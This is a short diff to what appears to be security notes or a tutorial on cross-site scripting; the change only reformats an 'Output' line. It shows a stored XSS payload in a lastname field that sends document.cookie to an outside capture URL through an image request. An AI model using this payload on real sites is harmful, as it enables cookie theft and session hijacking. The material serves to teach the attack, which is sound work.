@@ -383,7 +383,7 @@ Payload:
 
 - firstname: `John`
 - lastname:	`Doe<script> new Image().src='http://192.168.33.10/support/capture_page.php?' + document.cookie; </script>`
-Output: `Hello John Doe[ broken image link ]! 
+- Output: `Hello John Doe[ broken image link ]!`
 
 Browsers automatically perform GET requests to `src` URLs!!
 
